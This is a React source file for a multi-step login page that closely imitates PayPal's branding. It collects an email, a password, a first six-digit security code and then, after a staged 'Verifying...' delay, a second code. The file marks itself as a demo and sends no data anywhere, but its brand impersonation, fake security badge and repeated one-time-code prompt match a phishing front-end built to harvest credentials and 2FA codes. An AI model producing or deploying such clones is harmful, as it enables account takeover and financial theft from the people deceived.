import { useState } from "react";
import { PayPalFullLogo } from "@/components/PayPalLogo";
import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [verificationCode2, setVerificationCode2] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState<LoginStep>("email");
  const [isLoading, setIsLoading] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<"sms" | "email">("sms");
  const [codeSent, setCodeSent] = useState(false);
  const { toast } = useToast();

  const maskedPhone = "••••••7890";
  const maskedEmail = email ? `${email.substring(0, 3)}•••@${email.split("@")[1] || "demo.com"}` : "tes•••@demo.com";

  const handleEmailNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      setStep("password");
    }
  };

  const handlePasswordNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) return;
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep("verify-method");
    }, 500);
  };

  const handleSendCode = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setCodeSent(true);
      setStep("verify-code");
      toast({
        title: "Code Sent",
        description: `Demo: A code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
      });
    }, 600);
  };

  const handleVerifyCode = (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode.length < 6) return;
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep("verifying");
      
      // After 5 seconds of verifying animation, show second code prompt
      setTimeout(() => {
        setStep("verify-code-2");
        toast({
          title: "Additional Verification Required",
          description: `Demo: A second code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
        });
      }, 5000);
    }, 800);
  };

  const handleVerifyCode2 = (e: React.FormEvent) => {
    e.preventDefault();
    if (verificationCode2.length < 6) return;
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      toast({
        title: "Verification Successful",
        description: "Demo: You would now be logged in to your PayPal account.",
      });
      setStep("email");
      setEmail("");
      setPassword("");
      setVerificationCode("");
      setVerificationCode2("");
      setCodeSent(false);
    }, 800);
  };

  const handleBackToEmail = () => {
    setStep("email");
    setPassword("");
    setVerificationCode("");
    setVerificationCode2("");
    setCodeSent(false);
  };

  const handleBackToPassword = () => {
    setStep("password");
    setVerificationCode("");
    setVerificationCode2("");
    setCodeSent(false);
  };

  const handleBackToVerifyMethod = () => {
    setStep("verify-method");
    setVerificationCode("");
  };

  const handleBackToFirstCode = () => {
    setStep("verify-code");
    setVerificationCode2("");
  };

  const renderVerifyCode2Step = () => (
    <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
      <button
        type="button"
        onClick={handleBackToFirstCode}
        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
        data-testid="button-back-first-code"
      >
        <ChevronLeft className="w-5 h-5" />
        <span className="text-[14px]">Back</span>
      </button>

      <div className="flex flex-col items-center mb-6">
        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
          {selectedMethod === "sms" ? (
            <Smartphone className="w-8 h-8 text-[#0070e0]" />
          ) : (
            <Mail className="w-8 h-8 text-[#0070e0]" />
          )}
        </div>
        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
          Enter second security code
        </h2>
        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
          We sent a new code to {selectedMethod === "sms" ? maskedPhone : maskedEmail}
        </p>
      </div>

      <div className="space-y-5">
        <div>
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter 6-digit code"
            value={verificationCode2}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
              setVerificationCode2(value);
            }}
            className="paypal-input text-center text-[20px] tracking-[0.5em] font-medium"
            data-testid="input-code-2"
            autoFocus
            maxLength={6}
          />
          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-2">
            Demo: Enter any 6 digits
          </p>
        </div>

        <button
          type="submit"
          className="paypal-btn-primary flex items-center justify-center gap-2"
          disabled={verificationCode2.length < 6 || isLoading}
          data-testid="button-verify-2"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Confirm"
          )}
        </button>

        <div className="text-center">
          <button
            type="button"
            className="paypal-btn-text"
            data-testid="button-resend-2"
            onClick={() => {
              toast({
                title: "Code Resent",
                description: `Demo: A new code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
              });
            }}
          >
            Resend code
          </button>
        </div>

        <div className="pt-4 border-t border-[#e8e8e8] dark:border-[#3d3d3d]">
          <button
            type="button"
            className="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-[#f5f5f5] dark:hover:bg-[#2a2a2a] transition-colors"
            data-testid="button-try-another-2"
            onClick={handleBackToVerifyMethod}
          >
            <div className="w-8 h-8 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
              <Lock className="w-4 h-4 text-[#0070e0]" />
            </div>
            <span className="text-[14px] text-[#0070e0] font-medium">Try another way</span>
          </button>
        </div>
      </div>
    </form>
  );

  const footerLinks = [
    "Help",
    "Contact",
    "Fees", 
    "Security",
    "Apps",
    "Shop",
    "Enterprise",
    "Partners"
  ];

  const renderEmailStep = () => (
    <form onSubmit={handleEmailNext} data-testid="form-email">
      <h1 
        className="text-[24px] sm:text-[28px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-8 tracking-tight"
        data-testid="text-title"
      >
        Log in to PayPal
      </h1>
      
      <div className="space-y-5">
        <div>
          <input
            type="text"
            placeholder="Email or mobile number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="paypal-input"
            data-testid="input-email"
            autoComplete="email"
            autoFocus
          />
        </div>

        <button
          type="submit"
          className="paypal-btn-primary"
          disabled={!email.trim()}
          data-testid="button-next"
        >
          Next
        </button>

        <div className="paypal-divider">
          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] font-medium">or</span>
        </div>

        <button
          type="button"
          className="paypal-btn-secondary"
          data-testid="button-signup"
          onClick={() => {
            toast({
              title: "Demo Mode",
              description: "Sign up is not available in this demo.",
            });
          }}
        >
          Sign Up
        </button>
      </div>
    </form>
  );

  const renderPasswordStep = () => (
    <form onSubmit={handlePasswordNext} data-testid="form-password">
      <div className="flex flex-col items-center mb-8">
        <div 
          className="w-[72px] h-[72px] rounded-full bg-gradient-to-br from-[#0070e0] to-[#003087] flex items-center justify-center text-[28px] font-semibold text-white mb-4 shadow-lg"
          data-testid="avatar-user"
        >
          {email.charAt(0).toUpperCase()}
        </div>
        <button
          type="button"
          onClick={handleBackToEmail}
          className="paypal-link text-[15px] flex items-center gap-1"
          data-testid="button-change-email"
        >
          {email}
          <ChevronDown className="w-4 h-4" />
        </button>
      </div>

      <div className="space-y-5">
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="paypal-input pr-14"
            data-testid="input-password"
            autoComplete="current-password"
            autoFocus
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white transition-colors"
            data-testid="button-toggle-password"
            aria-label={showPassword ? "Hide password" : "Show password"}
          >
            {showPassword ? (
              <EyeOff className="w-5 h-5" />
            ) : (
              <Eye className="w-5 h-5" />
            )}
          </button>
        </div>

        <div className="flex justify-between items-center">
          <label className="flex items-center gap-2 cursor-pointer group">
            <input 
              type="checkbox" 
              className="w-4 h-4 rounded border-2 border-[#c4c4c4] text-[#0070e0] focus:ring-[#0070e0] focus:ring-offset-0"
            />
            <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] group-hover:text-[#1a1a1a] dark:group-hover:text-white transition-colors">
              Stay logged in
            </span>
          </label>
          <button
            type="button"
            className="paypal-btn-text"
            data-testid="link-forgot-password"
            onClick={() => {
              toast({
                title: "Demo Mode",
                description: "Password recovery is not available in this demo.",
              });
            }}
          >
            Forgot password?
          </button>
        </div>

        <button
          type="submit"
          className="paypal-btn-primary flex items-center justify-center gap-2"
          disabled={!password.trim() || isLoading}
          data-testid="button-login"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Log In"
          )}
        </button>

        <div className="paypal-divider">
          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] font-medium">or</span>
        </div>

        <button
          type="button"
          className="paypal-btn-secondary flex items-center justify-center gap-2"
          data-testid="button-one-touch"
          onClick={() => {
            toast({
              title: "Demo Mode",
              description: "One Touch login is not available in this demo.",
            });
          }}
        >
          <User className="w-5 h-5" />
          Log in with a one-time code
        </button>
      </div>
    </form>
  );

  const renderVerifyMethodStep = () => (
    <div data-testid="form-verify-method">
      <button
        type="button"
        onClick={handleBackToPassword}
        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
        data-testid="button-back-password"
      >
        <ChevronLeft className="w-5 h-5" />
        <span className="text-[14px]">Back</span>
      </button>

      <div className="flex flex-col items-center mb-6">
        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
          <Lock className="w-8 h-8 text-[#0070e0]" />
        </div>
        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
          Verify it's you
        </h2>
        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
          We'll send you a code to confirm your identity
        </p>
      </div>

      <div className="space-y-3 mb-6">
        <button
          type="button"
          onClick={() => setSelectedMethod("sms")}
          className={`w-full p-4 rounded-lg border-2 flex items-center gap-4 transition-all ${
            selectedMethod === "sms" 
              ? "border-[#0070e0] bg-[#f5f9fc] dark:bg-[#0a1a2a]" 
              : "border-[#e0e0e0] dark:border-[#3d3d3d] hover:border-[#a0a0a0] dark:hover:border-[#5a5a5a]"
          }`}
          data-testid="option-sms"
        >
          <div className="w-10 h-10 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
            <Smartphone className="w-5 h-5 text-[#0070e0]" />
          </div>
          <div className="text-left">
            <p className="text-[15px] font-medium text-[#1a1a1a] dark:text-white">Text message</p>
            <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]">{maskedPhone}</p>
          </div>
          {selectedMethod === "sms" && (
            <div className="ml-auto w-5 h-5 rounded-full bg-[#0070e0] flex items-center justify-center">
              <div className="w-2 h-2 rounded-full bg-white" />
            </div>
          )}
        </button>

        <button
          type="button"
          onClick={() => setSelectedMethod("email")}
          className={`w-full p-4 rounded-lg border-2 flex items-center gap-4 transition-all ${
            selectedMethod === "email" 
              ? "border-[#0070e0] bg-[#f5f9fc] dark:bg-[#0a1a2a]" 
              : "border-[#e0e0e0] dark:border-[#3d3d3d] hover:border-[#a0a0a0] dark:hover:border-[#5a5a5a]"
          }`}
          data-testid="option-email"
        >
          <div className="w-10 h-10 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
            <Mail className="w-5 h-5 text-[#0070e0]" />
          </div>
          <div className="text-left">
            <p className="text-[15px] font-medium text-[#1a1a1a] dark:text-white">Email</p>
            <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]">{maskedEmail}</p>
          </div>
          {selectedMethod === "email" && (
            <div className="ml-auto w-5 h-5 rounded-full bg-[#0070e0] flex items-center justify-center">
              <div className="w-2 h-2 rounded-full bg-white" />
            </div>
          )}
        </button>
      </div>

      <button
        type="button"
        onClick={handleSendCode}
        className="paypal-btn-primary flex items-center justify-center gap-2"
        disabled={isLoading}
        data-testid="button-send-code"
      >
        {isLoading ? (
          <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
        ) : (
          "Send Code"
        )}
      </button>

      <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-4">
        Standard messaging rates may apply
      </p>
    </div>
  );

  const renderVerifyingStep = () => (
    <div data-testid="form-verifying" className="flex flex-col items-center justify-center py-12">
      <div className="mb-8 relative">
        <div className="w-24 h-24 animate-pulse">
          <PayPalFullLogo className="w-full h-full" />
        </div>
        <div className="absolute -inset-4 rounded-full border-4 border-[#0070e0] border-t-transparent animate-spin" />
      </div>
      <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
        Verifying...
      </h2>
      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[300px]">
        Please wait while we verify your information
      </p>
    </div>
  );

  const renderVerifyCodeStep = () => (
    <form onSubmit={handleVerifyCode} data-testid="form-verify-code">
      <button
        type="button"
        onClick={handleBackToVerifyMethod}
        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
        data-testid="button-back-method"
      >
        <ChevronLeft className="w-5 h-5" />
        <span className="text-[14px]">Back</span>
      </button>

      <div className="flex flex-col items-center mb-6">
        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
          {selectedMethod === "sms" ? (
            <Smartphone className="w-8 h-8 text-[#0070e0]" />
          ) : (
            <Mail className="w-8 h-8 text-[#0070e0]" />
          )}
        </div>
        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
          Enter security code
        </h2>
        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
          We sent a code to {selectedMethod === "sms" ? maskedPhone : maskedEmail}
        </p>
      </div>

      <div className="space-y-5">
        <div>
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter 6-digit code"
            value={verificationCode}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
              setVerificationCode(value);
            }}
            className="paypal-input text-center text-[20px] tracking-[0.5em] font-medium"
            data-testid="input-code"
            autoFocus
            maxLength={6}
          />
          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-2">
            Demo: Enter any 6 digits
          </p>
        </div>

        <button
          type="submit"
          className="paypal-btn-primary flex items-center justify-center gap-2"
          disabled={verificationCode.length < 6 || isLoading}
          data-testid="button-verify"
        >
          {isLoading ? (
            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            "Confirm"
          )}
        </button>

        <div className="text-center">
          <button
            type="button"
            className="paypal-btn-text"
            data-testid="button-resend"
            onClick={() => {
              toast({
                title: "Code Resent",
                description: `Demo: A new code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
              });
            }}
          >
            Resend code
          </button>
        </div>

        <div className="pt-4 border-t border-[#e8e8e8] dark:border-[#3d3d3d]">
          <button
            type="button"
            className="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-[#f5f5f5] dark:hover:bg-[#2a2a2a] transition-colors"
            data-testid="button-try-another"
            onClick={handleBackToVerifyMethod}
          >
            <div className="w-8 h-8 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
              <Lock className="w-4 h-4 text-[#0070e0]" />
            </div>
            <span className="text-[14px] text-[#0070e0] font-medium">Try another way</span>
          </button>
        </div>
      </div>
    </form>
  );

  return (
    <div className="min-h-screen bg-white dark:bg-[#0a0a0a] flex flex-col">
      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center pt-10 sm:pt-16 pb-8 px-4">
        {/* Logo */}
        <div className="mb-10">
          <PayPalFullLogo className="h-[28px] sm:h-[32px] w-auto" />
        </div>

        {/* Login Card */}
        <div className="paypal-card w-full max-w-[440px]">
          {step === "email" && renderEmailStep()}
          {step === "password" && renderPasswordStep()}
          {step === "verify-method" && renderVerifyMethodStep()}
          {step === "verify-code" && renderVerifyCodeStep()}
          {step === "verifying" && renderVerifyingStep()}
          {step === "verify-code-2" && renderVerifyCode2Step()}
        </div>

        {/* Security Badge */}
        <div className="flex items-center justify-center gap-2 mt-8">
          <Lock className="w-4 h-4 text-[#6c7378] dark:text-[#8f8f8f]" />
          <span className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f]" data-testid="text-security">
            Secure connection
          </span>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-6 px-4 border-t border-[#e8e8e8] dark:border-[#2a2a2a]">
        <div className="max-w-[800px] mx-auto">
          {/* Language Selector */}
          <div className="flex items-center justify-center gap-1 mb-5">
            <button 
              className="flex items-center gap-1 paypal-btn-text text-[13px]"
              data-testid="button-language"
              onClick={() => {
                toast({
                  title: "Demo Mode",
                  description: "Language selection is not available in this demo.",
                });
              }}
            >
              English
              <ChevronDown className="w-4 h-4" />
            </button>
          </div>

          {/* Footer Links */}
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-5">
            {footerLinks.map((link) => (
              <button
                key={link}
                className="paypal-btn-text text-[13px]"
                data-testid={`link-footer-${link.toLowerCase()}`}
                onClick={() => {
                  toast({
                    title: "Demo Mode",
                    description: `${link} page is not available in this demo.`,
                  });
                }}
              >
                {link}
              </button>
            ))}
          </div>

          {/* Copyright */}
          <p 
            className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center"
            data-testid="text-copyright"
          >
            &copy; 1999-{new Date().getFullYear()} PayPal, Inc. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
